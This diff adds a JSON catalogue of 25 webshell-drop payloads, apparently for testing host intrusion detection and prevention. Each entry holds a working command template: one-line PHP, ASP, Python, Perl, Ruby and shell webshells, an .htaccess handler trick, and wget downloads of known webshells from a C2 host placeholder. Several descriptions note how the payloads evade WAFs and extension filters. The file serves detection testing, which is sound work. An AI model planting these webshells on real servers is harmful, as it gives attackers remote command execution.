@@ -1,0 +1,950 @@
+[
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: php one-liner eval",
+    "payload_external_id": "HIDS-WEBSHELLDROP-001",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "落 1 行 php eval webshell 到 web 根。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '<?php @eval($_POST[\"x\"]);?>' > {{WEBROOT}}/x.php",
+    "hids_artifact_path": "{{WEBROOT}}/x.php",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/x.php",
+      "file_ext:.php"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: php base64 eval",
+    "payload_external_id": "HIDS-WEBSHELLDROP-002",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "base64 编码 webshell 绕过简单签名。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '<?php @eval(base64_decode($_POST[\"c\"]));?>' > {{WEBROOT}}/shell.php",
+    "hids_artifact_path": "{{WEBROOT}}/shell.php",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/shell.php"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: php assert",
+    "payload_external_id": "HIDS-WEBSHELLDROP-003",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "PHP assert 替代 eval（部分 WAF 不查 assert）。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '<?php @assert($_REQUEST[\"a\"]);?>' > {{WEBROOT}}/a.php",
+    "hids_artifact_path": "{{WEBROOT}}/a.php",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/a.php"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: php proc_open",
+    "payload_external_id": "HIDS-WEBSHELLDROP-004",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "PHP proc_open 复杂 webshell（含 stdin/stdout）。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "wget http://{{C2_HOST}}/proc.php -O {{WEBROOT}}/proc.php",
+    "hids_artifact_path": "{{WEBROOT}}/proc.php",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/proc.php",
+      "http_outbound:{{C2_HOST}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: jsp passthru",
+    "payload_external_id": "HIDS-WEBSHELLDROP-005",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Tomcat 落 .jsp 使用 Runtime.exec 执行参数。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "cp jsp_passthru.jsp {{WEBROOT}}/cmd.jsp",
+    "hids_artifact_path": "{{WEBROOT}}/cmd.jsp",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/cmd.jsp",
+      "file_ext:.jsp"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: jspx polyglot",
+    "payload_external_id": "HIDS-WEBSHELLDROP-006",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": ".jspx XML 形态 webshell，绕过基于扩展名仅检 .jsp 的过滤。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "cp poly.jspx {{WEBROOT}}/x.jspx",
+    "hids_artifact_path": "{{WEBROOT}}/x.jspx",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/x.jspx"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: aspx Server.Execute",
+    "payload_external_id": "HIDS-WEBSHELLDROP-007",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "IIS 落 .aspx Server.Execute webshell。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "type ash.aspx > C:\\inetpub\\wwwroot\\x.aspx",
+    "hids_artifact_path": "C:\\inetpub\\wwwroot\\x.aspx",
+    "hids_expected_artifacts": [
+      "file_create:C:\\inetpub\\wwwroot\\x.aspx"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: asp classic",
+    "payload_external_id": "HIDS-WEBSHELLDROP-008",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "落 ASP classic webshell（老 IIS）。",
+    "payload_platforms": [
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '<%eval request(\"cmd\")%>' > C:\\inetpub\\wwwroot\\c.asp",
+    "hids_artifact_path": "C:\\inetpub\\wwwroot\\c.asp",
+    "hids_expected_artifacts": [
+      "file_create:C:\\inetpub\\wwwroot\\c.asp"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: python cgi",
+    "payload_external_id": "HIDS-WEBSHELLDROP-009",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "/var/www/cgi-bin 落 .py CGI webshell。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '#!/usr/bin/env python3\\nimport cgi,os;print(\"Content-Type: text/plain\\\\n\");os.system(cgi.FieldStorage().getvalue(\"c\",\"id\"))' > /var/www/cgi-bin/c.py;chmod +x /var/www/cgi-bin/c.py",
+    "hids_artifact_path": "/var/www/cgi-bin/c.py",
+    "hids_expected_artifacts": [
+      "file_create:/var/www/cgi-bin/c.py",
+      "file_chmod:+x"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: perl cgi",
+    "payload_external_id": "HIDS-WEBSHELLDROP-010",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Apache cgi-bin 落 .pl webshell。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '#!/usr/bin/perl\\nuse CGI;print \"Content-type: text/plain\\\\n\\\\n\".`$ENV{QUERY_STRING}`;' > /var/www/cgi-bin/c.pl;chmod +x /var/www/cgi-bin/c.pl",
+    "hids_artifact_path": "/var/www/cgi-bin/c.pl",
+    "hids_expected_artifacts": [
+      "file_create:/var/www/cgi-bin/c.pl"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: ruby webshell",
+    "payload_external_id": "HIDS-WEBSHELLDROP-011",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Rails 应用根落 ruby webshell。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '<%= `#{params[:c]}` %>' > {{WEBROOT}}/c.erb",
+    "hids_artifact_path": "{{WEBROOT}}/c.erb",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/c.erb"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: .htaccess injection",
+    "payload_external_id": "HIDS-WEBSHELLDROP-012",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Apache .htaccess 配置使 .jpg 走 php handler，落 JPEG-polyglot webshell。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.004"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo 'AddType application/x-httpd-php .jpg' >> {{WEBROOT}}/.htaccess;cp shell.jpg {{WEBROOT}}/avatar.jpg",
+    "hids_artifact_path": "{{WEBROOT}}/.htaccess",
+    "hids_expected_artifacts": [
+      "file_modify:{{WEBROOT}}/.htaccess",
+      "file_create:{{WEBROOT}}/avatar.jpg"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: weevely shell",
+    "payload_external_id": "HIDS-WEBSHELLDROP-013",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Weevely 框架隐写 + AES webshell。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "weevely generate {{PASSWORD}} /tmp/w.php && cp /tmp/w.php {{WEBROOT}}/img.php",
+    "hids_artifact_path": "{{WEBROOT}}/img.php",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/img.php"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: behinder shell",
+    "payload_external_id": "HIDS-WEBSHELLDROP-014",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "冰蝎 v3 加密 webshell（AES + 动态密钥）落盘。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "wget http://{{C2_HOST}}/behinder.php -O {{WEBROOT}}/cms.php",
+    "hids_artifact_path": "{{WEBROOT}}/cms.php",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/cms.php",
+      "http_outbound:{{C2_HOST}}"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: godzilla shell",
+    "payload_external_id": "HIDS-WEBSHELLDROP-015",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "哥斯拉 webshell（AES + XOR）落盘。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "wget http://{{C2_HOST}}/godzilla.jsp -O {{WEBROOT}}/main.jsp",
+    "hids_artifact_path": "{{WEBROOT}}/main.jsp",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/main.jsp"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: antsword shell",
+    "payload_external_id": "HIDS-WEBSHELLDROP-016",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "蚁剑 webshell（HTTP 参数 base64 + 自定义编码）。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "wget http://{{C2_HOST}}/ant.php -O {{WEBROOT}}/ant.php",
+    "hids_artifact_path": "{{WEBROOT}}/ant.php",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/ant.php"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: china chopper",
+    "payload_external_id": "HIDS-WEBSHELLDROP-017",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "中国菜刀 1 行 php webshell（老牌）。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '<?php @eval($_POST[\"chopper\"]);?>' > {{WEBROOT}}/c.php",
+    "hids_artifact_path": "{{WEBROOT}}/c.php",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/c.php"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: suo5 tunnel",
+    "payload_external_id": "HIDS-WEBSHELLDROP-018",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "suo5 HTTP 隧道 webshell 落盘(高性能 chunked)。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "wget http://{{C2_HOST}}/suo5.jsp -O {{WEBROOT}}/upload.jsp",
+    "hids_artifact_path": "{{WEBROOT}}/upload.jsp",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/upload.jsp"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: neo-reGeorg",
+    "payload_external_id": "HIDS-WEBSHELLDROP-019",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Neo-reGeorg 多语言 webshell 隧道。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "wget http://{{C2_HOST}}/tunnel.php -O {{WEBROOT}}/t.php",
+    "hids_artifact_path": "{{WEBROOT}}/t.php",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/t.php"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: jsp upload + exec",
+    "payload_external_id": "HIDS-WEBSHELLDROP-020",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "落 jsp 上传组件用作二次落马跳板。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "wget http://{{C2_HOST}}/upload.jsp -O {{WEBROOT}}/up.jsp",
+    "hids_artifact_path": "{{WEBROOT}}/up.jsp",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/up.jsp"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: php-fpm sockets",
+    "payload_external_id": "HIDS-WEBSHELLDROP-021",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "php-fpm direct socket webshell（绕过 nginx 鉴权）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '<?php system($_GET[\"x\"]);?>' > {{WEBROOT}}/fpm.php",
+    "hids_artifact_path": "{{WEBROOT}}/fpm.php",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/fpm.php"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: ash shell (busybox)",
+    "payload_external_id": "HIDS-WEBSHELLDROP-022",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "BusyBox ash webshell（嵌入式 / OpenWrt）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "echo '#!/bin/sh\\necho \"Content-Type:text/plain\\\\n\";eval $QUERY_STRING' > /www/cgi-bin/a;chmod +x /www/cgi-bin/a",
+    "hids_artifact_path": "/www/cgi-bin/a",
+    "hids_expected_artifacts": [
+      "file_create:/www/cgi-bin/a"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: nodejs vm webshell",
+    "payload_external_id": "HIDS-WEBSHELLDROP-023",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Node.js Express 落 .js webshell 用 child_process。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "wget http://{{C2_HOST}}/express.js -O {{WEBROOT}}/api/x.js",
+    "hids_artifact_path": "{{WEBROOT}}/api/x.js",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/api/x.js"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: go .so plugin",
+    "payload_external_id": "HIDS-WEBSHELLDROP-024",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "Go plugin .so 形态 webshell（绕过基于扩展名）。",
+    "payload_platforms": [
+      "Linux"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1505.003"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "wget http://{{C2_HOST}}/plug.so -O {{WEBROOT}}/plug.so",
+    "hids_artifact_path": "{{WEBROOT}}/plug.so",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/plug.so"
+    ]
+  },
+  {
+    "payload_type": "HostAttack",
+    "payload_name": "Webshell Drop: polyglot gif-php",
+    "payload_external_id": "HIDS-WEBSHELLDROP-025",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "GIF magic byte + php tail polyglot 绕图片检查。",
+    "payload_platforms": [
+      "Linux",
+      "Windows"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [
+      "T1036.005"
+    ],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "hids",
+      "webshell_drop"
+    ],
+    "hids_category": "webshell_drop",
+    "hids_execution_mode": "file_drop",
+    "hids_command_template": "cp shell.gif {{WEBROOT}}/x.gif",
+    "hids_artifact_path": "{{WEBROOT}}/x.gif",
+    "hids_expected_artifacts": [
+      "file_create:{{WEBROOT}}/x.gif"
+    ]
+  }
+]
